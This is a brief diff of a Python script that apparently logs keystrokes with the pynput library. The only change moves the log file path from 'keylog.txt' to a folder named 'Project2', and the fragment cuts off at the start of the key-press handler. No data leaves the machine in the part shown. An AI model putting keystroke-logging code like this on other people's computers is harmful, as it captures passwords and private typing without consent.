@@ -1,7 +1,7 @@
 from pynput.keyboard import Key, Listener
 
 # Path to the file where you want to save the logged keys
-log_file = "keylog.txt"
+log_file = r"Project2\keylog.txt"
 
 def on_press(key):
     try:
